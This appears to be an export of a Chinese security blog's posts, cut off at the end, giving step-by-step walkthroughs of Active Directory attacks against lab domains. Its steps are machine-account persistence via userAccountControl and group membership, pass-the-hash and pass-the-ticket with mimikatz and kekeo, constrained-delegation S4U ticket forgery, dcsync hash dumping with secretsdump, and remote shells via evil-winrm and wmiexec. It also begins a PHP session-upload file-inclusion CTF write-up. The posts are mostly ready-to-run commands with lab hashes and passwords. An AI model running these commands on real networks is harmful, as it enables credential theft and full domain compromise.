<h3 id="修改机器账户userAccountControl属性值"><a href="#修改机器账户userAccountControl属性值" class="headerlink" title="修改机器账户userAccountControl属性值"></a>修改机器账户userAccountControl属性值</h3><p>我们所创建的这台机器账户primarygroupid经过查询可知是515，他是域组的RID，表示这是一台域计算机，利用Active-Module模块，使用域管权限账户为计算机账户Nayon修改<code>userAccountControl</code>值为8192，则primarygroupid将更改为属于域控制器（可写）的 516。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADComputer Nayon -pro * | Select-object name, primarygroupid, useraccountcontrol</span><br><span class="line">Set-ADComputer Nayon -replace @&#123; &quot;userAccountcontrol&quot; = 8192 &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217125926482.png" alt="image-20220217125926482"></p>
<p>[^此处若发现域主机内不存在Active Directory模块，可在本地上传Microsoft.ActiveDirectory.Management .dll在Powershell利用import-module 进行安装使用]: </p>
<p>此处为执行效果。</p>
<h3 id="获得机器账户hash"><a href="#获得机器账户hash" class="headerlink" title="获得机器账户hash"></a>获得机器账户hash</h3><p>由于我们已知机器账户的密码，因此我们可以利用它的NTLM 、aes128、aes256 hash 来进行pth，用于获得一个拥有域控制器权限的会话。</p>
<p>利用Rubes将Nayon账户的明文密码转为NTLM hash，用于维权时进行的pth。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:Nayon /password:Password@1! /domain:attack.local</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217182940119.png" alt="image-20220217182940119"></p>
<p>如图所示，成功拿到了机器账户的hash。</p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式:"></a>利用方式:</h3><h4 id="PTH传递获得权限"><a href="#PTH传递获得权限" class="headerlink" title="PTH传递获得权限"></a>PTH传递获得权限</h4><p>在域内机器上利用mimikatz进行pth攻击，成功弹回具有Nayon用户权限的新会话。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:Nayon /domain:attack.local /aes128:95F9380561068098A673F425207EFA0D</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217183728074.png" alt="image-20220217183728074"></p>
<p><strong>注意：此处拿到的会话，唯有域用户处于高权限组内才可使用dcsync获得域内hash。</strong></p>
<h4 id="利用PTT获得权限"><a href="#利用PTT获得权限" class="headerlink" title="利用PTT获得权限"></a>利用PTT获得权限</h4><p>由于PTH是需要本地管理员权限的，若我们此时连本地管理员权限都没有，我们还可以使用mimikatz自带的ptt功能拿到相应权限。</p>
<p><strong>注意：此处拿到的会话，本人本地测试即使是将机器用户的<code>userAccountConrol</code>属性值改为8192也无法执行dcsync获得域内hash，唯有划入域内高权限组内可以使用机器账户权限执行dcsync。</strong></p>
<p>利用利用Rubes申请拿到机器账户的hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash /user:Nayon /password:123456 /domain:attack.local</span><br></pre></td></tr></table></figure>

<p>使用keke申请tgt票据，用于下一步的ptt攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:Nayon2 /domain:attack.local /ntlm:32ED87BDB5FDC5E9CBA88547376818D4</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181751543.png" alt="image-20220219181751543"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  TGT_Nayon@ATTACK.LOCAL_krbtgt~attack.local@ATTACK.LOCAL.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219181849365.png" alt="image-20220219181849365"></p>
<p>此时成功拿到域内hash</p>
<h4 id="利用impacket套件执行dcsync"><a href="#利用impacket套件执行dcsync" class="headerlink" title="利用impacket套件执行dcsync"></a>利用impacket套件执行dcsync</h4><p>使用Impacket套件中的secretsdump.py脚本，结合域内机器账户的凭证拖取域内hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py attack.local/Nayon\$:&#x27;Password@1!&#x27;@10.10.10.165 -just-dc</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217224346573.png" alt="image-20220217224346573"></p>
<p>利用其中的域管NTLM hash与域控机进行通信</p>
<h4 id="Evil-WinRM通过WinRM远程链接"><a href="#Evil-WinRM通过WinRM远程链接" class="headerlink" title="Evil-WinRM通过WinRM远程链接"></a>Evil-WinRM通过WinRM远程链接</h4><p>前提是域管开启WinRM服务，默认端口5985</p>
<p>指定域管用户以及域管用户的NTLM hash 远程链接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.165 -u administrator -H dbf36575210cc5a38ab4050cc6a2e9aa</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217233828242.png" alt="image-20220217233828242"></p>
<h4 id="Impacket套件wmiexec-py远程链接"><a href="#Impacket套件wmiexec-py远程链接" class="headerlink" title="Impacket套件wmiexec.py远程链接"></a>Impacket套件wmiexec.py远程链接</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 wmiexec.py -hash dbf36575210cc5a38ab4050cc6a2e9aa administrator@10.10.10.165</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220217234439955.png" alt="image-20220217234439955"></p>
<h3 id="加入高权限用户组用以维权"><a href="#加入高权限用户组用以维权" class="headerlink" title="加入高权限用户组用以维权"></a>加入高权限用户组用以维权</h3><p>除去域用户之外，域内机器账户也可以添加到高权限用户组中用以维权。利用Active Directory模块查询域管用户所在的用户组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-ADGroupMember &quot;administrators&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220218223834377.png" alt="image-20220218223834377"></p>
<p>使用域管权限的会话添加机器账户Nayon$到高权限用户组内。</p>
<p>可加入Enterprise Admins、Administrators、Domain Admins等高权限组内用以维权。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Enterprise admins&quot; Nayon$ /add /domain</span><br></pre></td></tr></table></figure>

<p>利用net group查看是否被添加成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;Enterprise admins&quot; /domain</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219174954928.png" alt="image-20220219174954928"></p>
<p>此时我们便可以使用Impacket中的secretsdump项目获得域内hash</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py attack.local/Nayon\$:<span class="string">&#x27;123456&#x27;</span>@10.<span class="number">10.10</span>.<span class="number">165</span> -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E8%BF%9B%E8%A1%8C%E5%9F%9F%E7%BB%B4%E6%9D%83.assets/image-20220219182324269.png" alt="image-20220219182324269"></p>
<p>其余利用方式大同小异，在这里我便不再过多赘述了……</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>约束委派攻击</title>
    <url>/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p>
<p><strong>流程:</strong></p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109233827841.png" alt="    "></p>
<span id="more"></span>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1.用户向Service1发送请求</span><br><span class="line"></span><br><span class="line">2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。</span><br><span class="line"></span><br><span class="line">3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。</span><br><span class="line"></span><br><span class="line">4.Service1在步骤3使用模拟用户申请KDC所获得的ST1票据与User进行验证，然后响应用户的请求。</span><br><span class="line"></span><br><span class="line">注:这个过程其实Service1是获得了用户的ST1和TGT的，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。</span><br><span class="line"></span><br><span class="line">5.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。</span><br><span class="line"></span><br><span class="line">	A。Service1已经通过验证，并且有一个有效的TGT。</span><br><span class="line"></span><br><span class="line">	B。Service1有从用户到Service1的forwardableST（可转发ST），此处我认为，根据流程来看，可转发ST1其实就是ST1，用于(6)的验证</span><br><span class="line"></span><br><span class="line">6.Service1代表用户向Service2请求一个用于认证Service2的ST(称之为ST2)。用户在ST1中通过cname (client name) 和crealm(client name)进行标示。</span><br><span class="line"></span><br><span class="line">7.KDC接收到(6)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回ST2给service1,不过这个ST2中的cname crealm标示的是用户而不是service1。</span><br><span class="line"></span><br><span class="line">8.service1代表用户使用ST2请求访问Service2</span><br><span class="line"></span><br><span class="line">9.Service2响应Service1的请求</span><br><span class="line"></span><br><span class="line">10.Service1将Service2的响应转发给User。</span><br></pre></td></tr></table></figure>

<p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p>
<p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p>
<h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a><strong>前期准备</strong>：</h4><p>​    域控机为域用户配置SPN，用于域用户配置约束委派</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -U -A SQL/test win2016</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205432579.png" alt="image-20220116205432579"></p>
<p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p>
<p>为win2016用户配置约束委派，做win2    019机器的cifs服务的委派</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205616253.png" alt="image-20220116205616253"></p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205819779.png" alt="image-20220116205819779"></p>
<p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p>
<h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p>
<h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210212550.png" alt="image-20220116210212550"></p>
<p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p>
<h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212912030.png" alt="image-20220116212912030"></p>
<p>可以看到主机Win2016存在约束委派，委派了win2019机器的cifs服务</p>
<h4 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h4><h5 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a><strong>域用户存在约束委派:</strong></h5><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /password:Admin#123</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210849880.png" alt="image-20220116210849880"></p>
<h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211127487.png" alt="image-20220116211127487"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211348121.png" alt="image-20220116211348121"></p>
<h6 id="利用kekeo进行S4U伪造"><a href="#利用kekeo进行S4U伪造" class="headerlink" title="利用kekeo进行S4U伪造"></a>利用kekeo进行S4U伪造</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_win2016@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211749435.png" alt="image-20220116211749435"></p>
<h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211914613.png" alt="image-20220116211914613"></p>
<p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p>
<p>查看域控机的共享目录成功！</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212122245.png" alt="image-20220116212122245"></p>
<h5 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h5><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>注:需要管理员权限才可拿到密码Hash</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213302798.png" alt="image-20220116213302798"></p>
<h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgt::ask /user:win2016$ /domain:vulntarget.com /NTLM:e0cd419213811fd910ca6c3c42d764e7</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213633756.png" alt="image-20220116213633756"></p>
<p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p>
<h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_win2016$@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214205656.png" alt="image-20220116214205656"></p>
<h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214345566.png" alt="image-20220116214345566"></p>
<p>尝试对域控进行共享目录访问,利用成功！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\win2019.vulntarget.com\c$</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214439465.png" alt="image-20220116214439465"></p>
<p>注: 此处进行tgs::s4u伪造时，申请的service是cifs/win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p>
<h4 id="域外利用"><a href="#域外利用" class="headerlink" title="域外利用"></a>域外利用</h4><h5 id="域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令"><a href="#域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令" class="headerlink" title="域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:"></a>域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:</h5><h6 id="在域外探测存在约束委派的域用户账户"><a href="#在域外探测存在约束委派的域用户账户" class="headerlink" title="在域外探测存在约束委派的域用户账户:"></a>在域外探测存在约束委派的域用户账户:</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<h6 id="在域外探测存在约束委派的域主机"><a href="#在域外探测存在约束委派的域主机" class="headerlink" title="在域外探测存在约束委派的域主机:"></a>在域外探测存在约束委派的域主机:</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>

<h5 id="域外通过getST-py进行约束委派攻击"><a href="#域外通过getST-py进行约束委派攻击" class="headerlink" title="域外通过getST.py进行约束委派攻击"></a><strong>域外通过getST.py进行约束委派攻击</strong></h5><p>(可通过隧道，需提前通过hosts文件绑定ip与主机名)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -hashes :b223fae09b86d75482d2c61ac5f773fe -spn cifs/win2019.vulntarget.com -impersonate administrator vulntarget/win2016$ -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>

<p>-hashes:  NTLM hash</p>
<p>-spn: 约束委派指定的服务</p>
<p>-impersonate 伪造的用户 存在约束委派的域主机名</p>
<p>-dc-ip: dc地址</p>
<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116221830895.png" alt="image-20220116221830895"></p>
<p>拿到administrator.ccache</p>
<p>利用export加载环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>

<p>注: KPB5CCNAME 变量名不可变</p>
<h6 id="利用secretsdump-py-拖取hash"><a href="#利用secretsdump-py-拖取hash" class="headerlink" title="利用secretsdump.py 拖取hash"></a>利用secretsdump.py 拖取hash</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -k -no-pass win2019.vulntarget.com -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116224843756.png" alt="image-20220116224843756"></p>
<p>注: 此处使用的cifs服务进行的攻击，若脚本提示认证失败，最大的可能为我们的利用ST票据与攻击应该使用的ST票据不符。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>摸了……..</p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>利用session.upload_progress进行文件包含</title>
    <url>/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h3 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">此特性自PHP <span class="number">5.4</span>.<span class="number">0</span>后启用</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030211326157.png" alt="image-20211030211326157"></p>
<p>我们可以利用<code>session.upload_progress</code> 将木马写入session文件，然后包含这个文件。但是首先我们需要知道session文件将会保存在何处</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在Linux php中 session文件默认保存在/tmp/sess_session名中</span><br></pre></td></tr></table></figure>

<p>以及会如何保存</p>
<span id="more"></span>

<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030212042701.png" alt="image-20211030212042701"></p>
<p>默认<code>session.use_strict_mode</code>为off状态，也就是说，用户可以在浏览器或者Burpsuit中自定义session ID值用于指明sess文件名。</p>
<p>但是<code>session.upload_progress.cleanup</code>值为默认开启状态</p>
<p>当<code>session.upload_progress.cleanup</code>默认开启时，一旦读取了所有的POST数据，便会清除session文件。</p>
<p>此处我们可以利用条件竞争的方式进行利用文件上传，生成sess文件，趁着sess文件还未删除，进行包含利用。</p>
<p>CTFshow web入门 web82                     </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>此处可以看出，题目排除了<code>php://</code>、<code>data://</code>、<code>日志包含</code>的手法进行getshell，此处尝试利用<code>PHP_UPLOAD_PROGRESS</code>进行getshell</p>
<p>此处利用<code>php.net</code>提供的上传栏代码加以修改:</p>
